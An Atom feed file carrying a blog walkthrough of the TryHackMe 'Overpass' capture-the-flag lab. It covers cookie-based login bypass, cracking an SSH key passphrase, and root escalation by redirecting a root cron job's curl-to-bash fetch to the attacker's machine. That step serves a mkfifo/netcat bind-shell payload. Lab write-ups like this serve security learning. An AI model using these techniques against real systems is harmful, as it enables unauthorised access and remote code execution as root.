@@ -1,0 +1,159 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <title>Writups - linpeas</title>
+    <subtitle>A diary dedicated to exploring the world of cybersecurity and technology.</subtitle>
+    <link href="https://theanxiuser.github.io/writups/tags/linpeas/atom.xml" rel="self" type="application/atom+xml"/>
+    <link href="https://theanxiuser.github.io/writups"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2024-10-23T00:00:00+00:00</updated>
+    <id>https://theanxiuser.github.io/writups/tags/linpeas/atom.xml</id>
+    <entry xml:lang="en">
+        <title>Overpass - TryHackMe Writup</title>
+        <published>2024-10-23T00:00:00+00:00</published>
+        <updated>2024-10-23T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://theanxiuser.github.io/writups/chapters/overpass/" type="text/html"/>
+        <id>https://theanxiuser.github.io/writups/chapters/overpass/</id>
+        
+        <content type="html">&lt;div style=&quot;display: flex; align-items: center;&quot;&gt;
+  &lt;div&gt;
+    &lt;img src=&quot;overpass.png&quot; alt=&quot;overpass&quot; width=&quot;100&quot;&#x2F;&gt;
+  &lt;&#x2F;div&gt;
+  &lt;div style=&quot;margin-left: 10px;&quot;&gt;
+    &lt;i&gt;What happens when some broke CompSci students make a password manager?&lt;&#x2F;i&gt;
+  &lt;&#x2F;div&gt;
+&lt;&#x2F;div&gt;
+&lt;h2 id=&quot;1-enumeration&quot;&gt;1. Enumeration&lt;&#x2F;h2&gt;
+&lt;p&gt;Target IP address: 10.10.4.48&lt;&#x2F;p&gt;
+&lt;p&gt;Two ports are open.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ nmap -sV 10.10.4.48 -v
+
+PORT      STATE    SERVICE VERSION
+22&#x2F;tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80&#x2F;tcp    open     http    Golang net&#x2F;http server (Go-IPFS json-rpc or InfluxDB API)
+10628&#x2F;tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Okay, now starting by searching directories using gobuster as&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ gobuster dir -u http:&#x2F;&#x2F;10.10.4.48&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http:&#x2F;&#x2F;10.10.4.48&#x2F;
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster&#x2F;3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+&#x2F;img                  (Status: 301) [Size: 0] [--&gt; img&#x2F;]
+&#x2F;downloads            (Status: 301) [Size: 0] [--&gt; downloads&#x2F;]
+&#x2F;aboutus              (Status: 301) [Size: 0] [--&gt; aboutus&#x2F;]
+&#x2F;admin                (Status: 301) [Size: 42] [--&gt; &#x2F;admin&#x2F;]
+&#x2F;css                  (Status: 301) [Size: 0] [--&gt; css&#x2F;]
+......
+&lt;&#x2F;pre&gt;
+&lt;p&gt;We got admin as interesting and there is a login page.
+&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;overpass&#x2F;admin_login_page.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;There is client side login logic found in &lt;code&gt;login.js&lt;&#x2F;code&gt;, the main script is &lt;&#x2F;p&gt;
+&lt;pre&gt;
+async function login() {
+    const usernameBox = document.querySelector(&quot;#username&quot;);
+    const passwordBox = document.querySelector(&quot;#password&quot;);
+    const loginStatus = document.querySelector(&quot;#loginStatus&quot;);
+    loginStatus.textContent = &quot;&quot;
+    const creds = { username: usernameBox.value, password: passwordBox.value }
+    const response = await postData(&quot;&#x2F;api&#x2F;login&quot;, creds)
+    const statusOrCookie = await response.text()
+    if (statusOrCookie === &quot;Incorrect credentials&quot;) {
+        loginStatus.textContent = &quot;Incorrect Credentials&quot;
+        passwordBox.value=&quot;&quot;
+    } else {
+        Cookies.set(&quot;SessionToken&quot;,statusOrCookie)
+        window.location = &quot;&#x2F;admin&quot;
+    }
+}
+&lt;&#x2F;pre&gt;
+&lt;p&gt;It seems that, if the value of &lt;code&gt;statusOrCookie&lt;&#x2F;code&gt; is &lt;code&gt;Incorrect Credentials&lt;&#x2F;code&gt;, then the error occurs, otherwise log on. Lets try to tweak the variable &lt;code&gt;statusOrCookie&lt;&#x2F;code&gt;. May be directly hampring this pariable is difficult as this is from backend side. Instead we can set the cookies, as shown in else block to any value.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;2-attacking&quot;&gt;2. Attacking&lt;&#x2F;h2&gt;
+&lt;p&gt;Lets try in console, by inspecting the page. Did this and refrest, I got logged in ant there I found RSA private key.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;overpass&#x2F;setting_cookies.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The message found there is&lt;&#x2F;p&gt;
+&lt;pre&gt;
+Welcome to the Overpass Administrator area
+A secure password manager with support for Windows, Linux, MacOS and more
+Since you keep forgetting your password, James, I&#x27;ve set up SSH keys for you.
+
+If you forget the password for this, crack it yourself. I&#x27;m tired of fixing stuff for you.
+Also, we really need to talk about this &quot;Military Grade&quot; encryption. - Paradox
+&lt;&#x2F;pre&gt;
+&lt;p&gt;That means we need to crack this key to get ssh password. We can use &lt;code&gt;ssh2john&lt;&#x2F;code&gt;. It converts ssh key into password hash and can be cracked using john. &lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;ssh2john rsa_private_key &amp;gt; password_hash&lt;&#x2F;code&gt;, here rsa_private_key contains the private key found in the admin page after login.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ john --wordlist=&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt password_hash
+.........
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+jam****          (rsa_private_key)
+Warning: Only 2 candidates left, minimum 8 needed for performance.
+1g 0:00:00:06 DONE (2024-10-10 08:41) 0.1652g&#x2F;s 2370Kp&#x2F;s 2370Kc&#x2F;s 2370KC&#x2F;sa6_123..*7¡Vamos!
+Session completed
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now we have ssh password&#x2F;passphrase for the user &lt;code&gt;james&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;3-capture-the-flag&quot;&gt;3. Capture the flag&lt;&#x2F;h2&gt;
+&lt;p&gt;Login via ssh and capture the user flag as&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;overpass&#x2F;user_flag_poc.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Here first, change the permission of the private key to &lt;code&gt;400&lt;&#x2F;code&gt; that means only the owner read the key. After that connect via ssh and provided passphrase to logged in, then found the &lt;code&gt;user.txt&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;There is todo.txt is found, it is&lt;&#x2F;p&gt;
+&lt;pre&gt;
+james@overpass-prod:~$ cat todo.txt 
+To Do:
+&gt; Update Overpass&#x27; Encryption, Muirland has been complaining that it&#x27;s not strong enough
+&gt; Write down my password somewhere on a sticky note so that I don&#x27;t forget it.
+  Wait, we make a password manager. Why don&#x27;t I just use that?
+&gt; Test Overpass for macOS, it builds fine but I&#x27;m not sure it actually works
+&gt; Ask Paradox how he got the automated build script working and where the builds go.
+  They&#x27;re not updating on the website
+&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;4-privilege-escalation&quot;&gt;4. Privilege escalation&lt;&#x2F;h2&gt;
+&lt;p&gt;There is the mention of automated build script. Maybe this can be helpful, but we need to enumerate first.&lt;&#x2F;p&gt;
+&lt;p&gt;I have downloaded &lt;code&gt;linpeas.sh&lt;&#x2F;code&gt; into my local machine, created http server using python as &lt;code&gt;python -m http.server&lt;&#x2F;code&gt; then download the script in target machine and ran there.&lt;&#x2F;p&gt;
+&lt;p&gt;Importent finding can be &lt;code&gt;&#x2F;etc&#x2F;hosts&lt;&#x2F;code&gt; file is writable by every user including we. Also looking into cornjob&lt;&#x2F;p&gt;
+&lt;pre&gt;
+james@overpass-prod:~$ cat &#x2F;etc&#x2F;crontab 
+# &#x2F;etc&#x2F;crontab: system-wide crontab
+# Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;
+# command to install the new version when you edit this file
+# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=&#x2F;bin&#x2F;sh
+PATH=&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly
+25 6	* * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )
+47 6	* * 7	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )
+52 6	1 * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )
+# Update builds from latest code
+* * * * * root curl overpass.thm&#x2F;downloads&#x2F;src&#x2F;buildscript.sh | bash
+&lt;&#x2F;pre&gt;
+&lt;p&gt;There is a script running by root, everytime and hosted in overpass.thm domain. So we need to setup payload in such a way that while running this job, our payload will be downloaded and runned so that the victim will be connected to out machine, using bind shell.&lt;&#x2F;p&gt;
+&lt;p&gt;For that need to setup server and path like this in my local device and need to add DNS record in &#x2F;etc&#x2F;hosts as shown below&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;10.17.58.84 overpass.thm&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;and the payload used in buildscript.sh is &lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;mkfifo &#x2F;tmp&#x2F;f; nc -lvnp 4444 &amp;lt; &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;sh &amp;gt;&#x2F;tmp&#x2F;f 2&amp;gt;&amp;amp;1; rm &#x2F;tmp&#x2F;f&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Here we go, got root flag too.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;overpass&#x2F;root_flag_poc.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Happy Hacking !!&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+</feed>
